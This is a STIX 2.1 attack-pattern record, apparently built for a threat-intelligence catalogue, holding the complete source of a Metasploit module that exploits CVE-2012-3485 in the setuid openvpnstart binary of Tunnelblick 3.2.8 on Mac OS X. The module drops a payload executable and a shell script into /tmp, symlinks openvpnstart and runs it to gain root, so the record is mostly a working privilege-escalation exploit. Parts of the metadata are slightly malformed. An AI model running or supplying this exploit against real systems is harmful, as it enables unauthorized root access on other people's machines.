{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d03cb9c3-2d35-47e2-950b-d9ab7383b6f0",
    "created": "2024-08-14T16:34:44.341378Z",
    "modified": "2024-08-14T16:34:44.341382Z",
    "name": "Setuid Tunnelblick Privilege Escalation",
    "description": " This module exploits a vulnerability in Tunnelblick 3.2.8 on Mac OS X. The vulnerability exists in the setuid openvpnstart, where an insufficient validation of path names allows execution of arbitrary shell scripts as root. This module has been tested successfully on Tunnelblick 3.2.8 build 2891.3099 over Mac OS X 10.7.5.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/setuid_tunnelblick.rb",
            "external_id": "setuid_tunnelblick.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.zx2c4.com/791"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::OSX::Priv\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super( update_info( info, {\n        'Name'           => 'Setuid Tunnelblick Privilege Escalation',\n        'Description'    => %q{\n            This module exploits a vulnerability in Tunnelblick 3.2.8 on Mac OS X. The\n          vulnerability exists in the setuid openvpnstart, where an insufficient\n          validation of path names allows execution of arbitrary shell scripts as root.\n          This module has been tested successfully on Tunnelblick 3.2.8 build 2891.3099\n          over Mac OS X 10.7.5.\n        },\n        'References'     =>\n          [\n            [ 'CVE', '2012-3485' ],\n            [ 'OSVDB', '84706' ],\n            [ 'EDB', '20443' ],\n            [ 'URL', 'http://blog.zx2c4.com/791' ]\n          ],\n        'License'        => MSF_LICENSE,\n        'Author'         =>\n          [\n            'Jason A. Donenfeld', # Vulnerability discovery and original Exploit\n            'juan vazquez'        # Metasploit module\n          ],\n        'DisclosureDate' => '2012-08-11',\n        'Platform'       => 'osx',\n        'Arch'           => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes'   => [ 'shell' ],\n        'Targets'        =>\n          [\n            [ 'Tunnelblick 3.2.8 / Mac OS X x86',    { 'Arch' => ARCH_X86 } ],\n            [ 'Tunnelblick 3.2.8 / Mac OS X x64',    { 'Arch' => ARCH_X64 } ]\n          ],\n        'DefaultOptions' => { \"PrependSetresuid\" => true, \"WfsDelay\" => 2 },\n        'DefaultTarget'  => 0\n      }))\n    register_options [\n        # These are not OptPath because it's a *remote* path\n        OptString.new(\"WritableDir\", [ true, \"A directory where we can write files\", \"/tmp\" ]),\n        OptString.new(\"Tunnelblick\", [ true, \"Path to setuid openvpnstart executable\", \"/Applications/Tunnelblick.app/Contents/Resources/openvpnstart\" ])\n      ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    unless file? datastore['Tunnelblick']\n      vprint_error 'openvpnstart not found'\n      return CheckCode::Safe\n    end\n\n    check = cmd_exec(\"find  #{datastore[\"Tunnelblick\"]} -type f -user root -perm -4000\")\n\n    unless check.include? 'openvpnstart'\n      return CheckCode::Safe\n    end\n\n    CheckCode::Vulnerable\n  end\n\n  def clean\n    file_rm(@link)\n    cmd_exec(\"rm -rf #{base_dir}/openvpn\")\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    if check != CheckCode::Vulnerable\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    print_status(\"Creating directory...\")\n    cmd_exec \"mkdir -p #{base_dir}/openvpn/openvpn-0\"\n\n    exe_name = rand_text_alpha(8)\n    @exe_file = \"#{base_dir}/openvpn/openvpn-0/#{exe_name}\"\n    print_status(\"Dropping executable #{@exe_file}\")\n    write_file(@exe_file, generate_payload_exe)\n    cmd_exec \"chmod +x #{@exe_file}\"\n\n\n    evil_sh =<<-EOF\n#!/bin/sh\n#{@exe_file}\n    EOF\n\n    @sh_file = \"#{base_dir}/openvpn/openvpn-0/openvpn\"\n    print_status(\"Dropping shell script #{@sh_file}...\")\n    write_file(@sh_file, evil_sh)\n    cmd_exec \"chmod +x #{@sh_file}\"\n\n    link_name = rand_text_alpha(8)\n    @link = \"#{base_dir}/#{link_name}\"\n    print_status(\"Creating symlink #{@link}...\")\n    cmd_exec \"ln -s -f -v #{datastore[\"Tunnelblick\"]} #{@link}\"\n\n    print_status(\"Running...\")\n    begin\n      cmd_exec \"#{@link} OpenVPNInfo 0\"\n    rescue\n      print_error(\"Failed. Cleaning files #{@link} and the #{base_dir}/openvpn directory\")\n      clean\n      return\n    end\n    print_warning(\"Remember to clean files: #{@link} and the #{base_dir}/openvpn directory\")\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-08-11",
    "x_mitre_platforms": [
        "osx'"
    ]
}